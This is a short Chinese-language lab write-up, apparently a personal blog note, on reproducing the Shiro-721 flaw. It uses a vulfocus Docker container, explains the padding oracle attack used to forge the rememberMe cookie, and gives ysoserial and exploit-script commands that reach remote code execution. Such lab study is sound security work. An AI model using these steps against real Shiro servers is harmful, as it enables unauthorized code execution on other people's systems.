---
title: Java反序列化Shiro篇02-Shiro721
date: 2025-10-4 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

# 环境搭建

```
docker pull vulfocus/shiro-721
 docker run -d -p 8080:8080 vulfocus/shiro-721
```

# 漏洞说明

Shiro>1.2.4往后对shiro550进行了修复，AES加密的key值不再是硬编码，是系统随机生成的。shiro721用到的加密方式是AES-CBC，而cookie解析过程跟cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的。

通过`Padding Oracle Attack`攻击可以实现破解`AES-CBC`加密过程进而实现rememberMe的内容伪造。

原理就是进行爆破

# 漏洞复现

使用给出的账号密码勾选rememberme登录之后，`cookie`中有`rememberme`值

![image-20251004151139808](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721/image-20251004151139808.png)

发送一个恶意的`rememberme`值。如果key正确，则返回包中不会有`rememberMe=DeleteMe`。如果不正确就会存在`rememberMe=DeleteMe`

先试用ysoserial.jar生成序列化后的内容，然后使用Padding Oracle Attack攻击脚本去爆破key值，爆破成功后替换rememberme即可

[inspiringz/Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack](./https://github.com/inspiringz/Shiro-721/tree/master)

```shell
java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/123" > payload.class


#Padding Oracle Attack攻击脚本使用方法
#安装脚本不需要 pip install paddingoracle
#使用exp目录下的脚本即可,exp目录下有paddingoracle脚本
Usage: .\shiro_exp.py <url> <somecookie value> <payload>
#注：这个攻击脚本运行时间很长
```

![image-20251004151441139](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721/image-20251004151441139.png)